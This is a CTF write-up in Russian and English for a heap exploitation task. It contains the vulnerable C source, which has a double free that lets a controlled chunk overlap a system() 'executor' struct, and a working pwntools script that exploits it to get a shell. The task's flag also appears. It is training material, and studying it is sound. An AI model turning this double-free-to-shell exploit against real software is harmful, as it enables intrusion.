[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_mc6)
Описание:
This one is mega-easy double free()!
`nc 109.233.56.90 11730`
**[mc6.elf](https://pwn.spbctf.ru/files/uaf/mc6/mc6.elf)**  
**[mc6.c](https://pwn.spbctf.ru/files/uaf/mc6/mc6.c)**

Исходный код:
``` C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

struct executor {
    char command[40];
};

struct executor * allocate_executor() {
    struct executor * obj = (struct executor *)malloc(sizeof(struct executor));
    strcpy(obj->command, "ls -la");
    printf("Executor allocated!\n");
    return obj;
}

void execute_command(struct executor * obj) {
    printf("Executing %s\n", obj->command);
    system(obj->command);
}

char * STROCHKEE[100];
int SIZES[100];
int COUNT = 0;

void list_strings() {
    for (int i = 0; i < COUNT; i++) {
        printf("  [%d] at %p -> '%s'\n", i, STROCHKEE[i], STROCHKEE[i]);
    }
}

void allocate_string() {
    int size;
    printf("Enter size: ");
    scanf("%d%*c", &size);
    
    char * str = malloc(size);
    printf("  malloc(%d) = %p\n", size, str);
    memset(str, '\0', size);
    STROCHKEE[COUNT] = str;
    SIZES[COUNT] = size;
    COUNT++;
}

void modify_string() {
    int idx;
    printf("Enter index to modify (0 - %d): ", COUNT - 1);
    scanf("%d%*c", &idx);
    
    if (idx < 0 || idx >= COUNT) {
        printf("Bad index\n");
        return;
    }
    
    char buf[256];
    printf("Enter new text for %p (max %d bytes): ", STROCHKEE[idx], SIZES[idx] - 1);
    scanf("%255s", buf);
    if (strlen(buf) >= SIZES[idx]) {
        printf("Too large!\n");
        return;
    }
    
    strcpy(STROCHKEE[idx], buf);
}

void free_string() {
    int idx;
    printf("Enter index to free (0 - %d): ", COUNT - 1);
    scanf("%d%*c", &idx);
    
    if (idx < 0 || idx >= COUNT) {
        printf("Bad index\n");
        return;
    }
    
    printf("Doing free(%p)\n", STROCHKEE[idx]);
    free(STROCHKEE[idx]);
    
    SIZES[idx] = 0;  // prevent writing anything there
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    
    struct executor * EXECUTOR = NULL;
    
    char choice[4];
    
    while (1) {
        printf("\nS T R O C H K E E E E\n");
        list_strings();
        printf("s - allocate string\n");
        printf("m - modify string\n");
        printf("f - free string\n");
        printf("e - allocate executor\n");
        if (EXECUTOR) {
            printf("x - execute command\n");
        }
        printf("choice: ");
        alarm(120);
        if (scanf("%1s", choice) != 1) {
            return 0;
        }
        
        if (choice[0] == 's') {
            allocate_string();
        } else if (choice[0] == 'm') {
            modify_string();
        } else if (choice[0] == 'f') {
            free_string();
        } else if (choice[0] == 'e') {
            EXECUTOR = allocate_executor();
        } else if (choice[0] == 'x' && EXECUTOR) {
            execute_command(EXECUTOR);
        }
    }
}
```
Необходимо сделать обычный Dobule Free.

Эксплоит:
``` python
def malloc(io):
    io.sendlineafter(b'choice: ', b's')
    io.sendlineafter(b'Enter size: ', b'40')

def free(io, index):
    io.sendlineafter(b'choice: ', b'f')
    io.sendlineafter(b': ', str(index).encode())

io = start()

for _ in range(10):
    malloc(io)

for i in range(10):
    free(io, i)
free(io, 8)

for _ in range(9):
    malloc(io)
io.sendlineafter(b'choice: ', b'e')

io.sendlineafter(b'choice: ', b'm')
io.sendlineafter(b': ', b'17')
io.sendlineafter(b': ', b'sh')

io.sendlineafter(b'choice: ', b'x')

io.interactive()
```

Запуск:
![{1135B8F8-3F08-4A31-86D3-AA81FCAC67FA}](../../../../z.%20Images/{1135B8F8-3F08-4A31-86D3-AA81FCAC67FA}.png)

Ответ: `spbctf{28d8b5a6f47f63d658235bea83edff3b}`